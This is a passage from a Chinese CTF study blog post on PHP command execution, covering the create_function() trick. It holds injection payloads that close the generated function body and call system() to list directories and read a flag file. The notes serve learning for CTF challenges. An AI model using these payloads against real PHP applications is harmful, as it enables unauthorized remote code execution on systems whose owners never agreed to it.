2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>



<h3 id="2-create-function"><a href="#2-create-function" class="headerlink" title="2.create_function()"></a>2.create_function()</h3><p>这个函数在某些方面可以进行命令执行，需要<code>$</code>没有被过滤，而且对php版本有要求</p>
<div class="code-container" code-lang="Php"><div class="codebox"><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell=<span class="keyword">echo</span> <span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;&#x27;</span>,<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>])();&amp;cmd=<span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat /tgfffffllllaagggggg&#x27;</span>);</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<p>但是上面这个也是有点极端的，应该是外面套了一层eval然后通过echo调用这个函数进行输出，条件还是有点苛刻，更多时候使用到的还是代码注入，闭合了就不需要触发函数才能输出了</p>
<p>我们需要知道creat_function会将第二个参数作为代码放入函数中实际上结果就是</p>
<div class="code-container" code-lang="Php"><div class="codebox"><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">functions</span></span>&#123;</span><br><span class="line">    <span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<p>然后再执行当前函数，所以我们可以通过闭合进行代码执行</p>
<div class="code-container" code-lang="Php"><div class="codebox"><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b=;&#125;<span class="title function_ invoke__">system</span>(<span class="string">&#x27;ls /&#x27;</span>);<span class="comment">/*</span></span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<p>效果如下</p>
<div class="code-container" code-lang="Php"><div class="codebox"><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">functions</span></span>&#123;</span><br><span class="line">    ;&#125;<span class="title function_ invoke__">system</span>(<span class="string">&#x27;ls /&#x27;</span>);<span class="comment">/*</span></span><br><span class="line"><span class="comment">&#125;</span></span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<p>我们这样可行的原因就是create_function会对其匿名函数使用一次eval，外面的system自然会被执行</p>
</div><div class="post-reward"><div class="post-reward-btn" title="赞赏作者"><img src="/assets/images/svg/uc/uc-gift.svg" class="icon noview" alt="Icon"><span></span></div><div class="post-reward-content"><div class="post-reward-text"></div><div class="post-reward-list"><a href="/null" target="_blank">致谢名单</a></div></div></div><div class="post-copyright"><div class="post-copyright-info">本作品由 Regulus 于 2025-02-05 15:42:02 发布</div><div class="post-copyright-link"><span>作品地址：<a href="http://example.com/2025/02/05/php%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">php命令执行</a></span><button class="copy-text" type="button" data-text="http://example.com/2025/02/05/php%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">复制</button></div><div class="post-copyright-detail">除特别声明外，本站作品均采用 <a href='https://creativecommons.org/licenses/by-nc-sa/4.0/' title='Attribution-NonCommercial-ShareAlike' target='_blank'>CC BY-NC-SA 4.0</a> 许可协议，转载请注明来自 <a href='/'>Mei的小窝</a></div><img class="post-copyright-icon noview" src="/assets/images/Hexo-Theme-MEOW.png" alt="Logo"/></div><div class="post-tail-tags"></div></div><aside id="post-sidebar" status="show"><div id="toc-container"><div class="toc-title"><img src="/assets/images/svg/ta/ta-toc.svg" class="icon noview" alt="Icon"><span>目录</span></div><div class="toc-content" id="toc-div"><ol class="toc-list"><li class="toc-list-item toc-list-level-1"><a class="toc-list-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0"><span class="toc-list-text">命令执行漏洞笔记</span></a><ol class="toc-list-child"><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-list-text">前言</span></a><ol class="toc-list-child"><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#1-%E4%BB%80%E4%B9%88%E6%98%AF%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E"><span class="toc-list-text">1.什么是命令执行漏洞</span></a></li><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#2-%E5%87%BA%E7%8E%B0%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%8E%9F%E5%9B%A0"><span class="toc-list-text">2.出现漏洞的原因</span></a></li></ol></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#1-%E5%91%BD%E4%BB%A4%E6%8B%BC%E6%8E%A5%E7%AC%A6"><span class="toc-list-text">1.命令拼接符</span></a><ol class="toc-list-child"><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#1-Windows"><span class="toc-list-text">1.Windows</span></a></li><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#2-Linux"><span class="toc-list-text">2.Linux</span></a></li></ol></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#2-%E5%8D%B1%E9%99%A9%E5%87%BD%E6%95%B0"><span class="toc-list-text">2.危险函数</span></a><ol class="toc-list-child"><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#1-system"><span class="toc-list-text">1.system()</span></a></li><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#2-passthru"><span class="toc-list-text">2.passthru()</span></a></li><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#3-exec"><span class="toc-list-text">3.exec()</span></a></li></ol></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#3-%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87"><span class="toc-list-text">3.过滤绕过</span></a><ol class="toc-list-child"><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#1-%E9%80%9A%E9%85%8D%E7%AC%A6"><span class="toc-list-text">1.通配符</span></a></li><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#2-%E5%85%B3%E9%94%AE%E7%AC%A6%E8%BF%87%E6%BB%A4"><span class="toc-list-text">2.关键符过滤</span></a></li><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#3-%E7%BB%BC%E5%90%88%E8%BF%87%E6%BB%A4%E7%BB%83%E4%B9%A0"><span class="toc-list-text">3.综合过滤练习</span></a></li><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#4-%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87"><span class="toc-list-text">4.空格绕过</span></a></li><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#5-%E5%85%B3%E9%94%AE%E8%AF%8D%E7%BB%95%E8%BF%87"><span class="toc-list-text">5.关键词绕过</span></a></li><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#6-%E7%A9%BA%E5%8F%98%E9%87%8F"><span class="toc-list-text">6.空变量</span></a></li><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#7-%E7%9B%AE%E5%BD%95%E8%B7%A8%E8%B6%8A"><span class="toc-list-text">7.目录跨越</span></a></li></ol></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#4-%E6%97%A0%E5%8F%82RCE"><span class="toc-list-text">4.无参RCE</span></a><ol class="toc-list-child"><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#1-%E5%87%BD%E6%95%B0"><span class="toc-list-text">1.函数</span></a></li><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#%E5%AE%9E%E6%88%98"><span class="toc-list-text">实战</span></a></li></ol></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#5-%E5%BC%82%E6%88%96%E6%8B%BC%E6%8E%A5%E5%AD%97%E7%AC%A6"><span class="toc-list-text">5.异或拼接字符</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#6-%E5%8F%96%E5%8F%8D%E7%BB%95%E8%BF%87"><span class="toc-list-text">6.取反绕过</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#7-dev-null-2-1"><span class="toc-list-text">7. &gt;&#x2F;dev&#x2F;null 2&gt;&amp;1</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#8-%E6%97%A0%E5%9B%9E%E6%98%BERCE"><span class="toc-list-text">8.无回显RCE</span></a><ol class="toc-list-child"><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#1-%E5%8F%8D%E5%BC%B9shell"><span class="toc-list-text">1.反弹shell</span></a></li><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#2-%E9%87%8D%E5%AE%9A%E5%90%91%E7%AC%A6"><span class="toc-list-text">2.重定向符</span></a></li><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#3-dnslog%E5%A4%96%E5%B8%A6"><span class="toc-list-text">3.dnslog外带</span></a></li></ol></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#9-PCRE%E5%9B%9E%E6%BA%AF%E6%AC%A1%E6%95%B0%E9%99%90%E5%88%B6%E7%BB%95%E8%BF%87-%E6%AD%A3%E5%88%99%E6%BA%A2%E5%87%BA"><span class="toc-list-text">9.PCRE回溯次数限制绕过(正则溢出)</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#10-%E5%81%9A%E9%A2%98%E7%BB%8F%E9%AA%8C%E5%92%8Cpayload"><span class="toc-list-text">10.做题经验和payload</span></a><ol class="toc-list-child"><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#1-session%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-list-text">1.session命令执行</span></a></li><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#2-create-function"><span class="toc-list-text">2.create_function()</span></a></li></ol></li></ol></li></ol></div></div></aside></div></div><div id="toolbar" hide=""><div id="toolbar-setting-container" hide=""><div class="toolbar-item"><button id="tool-color-mode" title="深色模式" type="button"><img src="/assets/images/svg/ta/ta-moon.svg" class="icon noview" alt="Icon"></button></div><div class="toolbar-item"><button class="copy-text" id="tool-share" title="分享" type="button" data-text="http://example.com/2025/02/05/php%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"><img src="/assets/images/svg/ta/ta-share.svg" class="icon noview" alt="Icon"></button></div><div class="toolbar-item"><button id="tool-font-size-plus" title="放大字体" type="button"><img src="/assets/images/svg/ta/ta-text-plus.svg" class="icon noview" alt="Icon"></button></div><div class="toolbar-item"><button id="tool-font-size-minus" title="缩小字体" type="button"><img src="/assets/images/svg/ta/ta-text-minus.svg" class="icon noview" alt="Icon"></button></div></div><div class="toolbar-container"><div class="toolbar-item"><button id="tool-setting" title="设置" type="button"><img src="/assets/images/svg/ta/ta-setting.svg" class="icon noview" alt="Icon"></button></div><div class="toolbar-item"><button id="tool-toc" title="目录" type="button"><img src="/assets/images/svg/ta/ta-toc.svg" class="icon noview" alt="Icon"></button></div><div class="toolbar-item"><button id="tool-gototop" title="返回顶部" type="button"><img src="/assets/images/svg/ta/ta-up.svg" class="icon noview" alt="Icon"></button></div></div></div><div class="search-overlay"><div class="search-container"><div class="search-header"><div class="search-title"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M10 10m-7 0a7 7 0 1 0 14 0a7 7 0 1 0 -14 0" /><path d="M21 21l-6 -6" /></svg>
搜索</div><div class="search-close-btn"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M12 21a9 9 0 0 0 9 -9a9 9 0 0 0 -9 -9a9 9 0 0 0 -9 9a9 9 0 0 0 9 9z" /><path d="M9 8l6 8" /><path d="M15 8l-6 8" /></svg></div></div><div class="search-input-box"><input id="search-input" type="search" placeholder="请输入关键词进行站内搜索……" value="" maxlength="80"/></div><div class="search-result-container"><div class="search-result-icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M10 10m-7 0a7 7 0 1 0 14 0a7 7 0 1 0 -14 0" /><path d="M21 21l-6 -6" /></svg></div></div></div></div></main><footer><div class="footer"><div id="footer-copyright">© 2024 - 2026 <span>💗</span> <a href="/null">Regulus</a></div><div id="footer-info"><div id="footer-framework">🚀本站由 <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/chanwj/hexo-theme-meow" title="3.2.0" target="_blank">Meow</a> 强力驱动</div><div id="footer-runtime"><span id="runtime" data-startdate="2024-04-02T22:16:20.000Z">🌻已稳定运行.年.月.天</span></div></div><div id="footer-statistic"><span>共撰写164篇文章，全站共409.6k字</span></div><div id="footer-pageview"><div id="container_site_pv"><span>🔥总访问量</span><span id="vercount_value_site_pv"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none"  stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M12 6l0 -3" /><path d="M16.25 7.75l2.15 -2.15" /><path d="M18 12l3 0" /><path d="M16.25 16.25l2.15 2.15" /><path d="M12 18l0 3" /><path d="M7.75 16.25l-2.15 2.15" /><path d="M6 12l-3 0" /><path d="M7.75 7.75l-2.15 -2.15" /></svg></span></div><div id="container_site_uv"><span>🐈访客人数</span><span id="vercount_value_site_uv"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none"  stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M12 6l0 -3" /><path d="M16.25 7.75l2.15 -2.15" /><path d="M18 12l3 0" /><path d="M16.25 16.25l2.15 2.15" /><path d="M12 18l0 3" /><path d="M7.75 16.25l-2.15 2.15" /><path d="M6 12l-3 0" /><path d="M7.75 7.75l-2.15 -2.15" /></svg></span></div></div></div></footer><div class="scripts"><script>const GLOBALCONFIG = {
  root: '/',
  toolbar: true,
  lazyload_src: '/assets/images/Meow-Loading.webp',
  friends: false,
  codeblock: true,
  share_text: '',
  onblur_title: 'Please Come Back～✧(´▽`ʃ♡ƪ)',
  mouse_click: false,
  notify:{
    enable: false,
    info: '复制成功～转载请标注本文地址',
    f12_info: '开发者模式已打开，请遵循本站版权协议'
  },
  search: {
    enable: true,
    path: 'search.json',
    local: {
      top_n_per_article: 1,
      preload: false
    }
  },
  encrypt: false,
};
</script><script>if (!localStorage.getItem('color-mode')) {
  localStorage.setItem('color-mode', 'light' || 'light');
}
document.body.setAttribute('data-mode', localStorage.getItem('color-mode'));
</script>
<script src="/js/theme/tools/utils.js"></script>

<script src="/js/plugins/dist/lazyload.min.js"></script>

<script src="/js/plugins/view-image.min.js"></script>
<script src="https://events.vercount.one/js" defer="defer"></script><script>if (localStorage.getItem('font-size')) {
  document.querySelector('.post').style.fontSize = localStorage.getItem('font-size') + 'px';
}
</script>
<script src="/js/plugins/dist/search.js"></script>

<script src="/js/main.js" type="module"></script>
</div></body></html>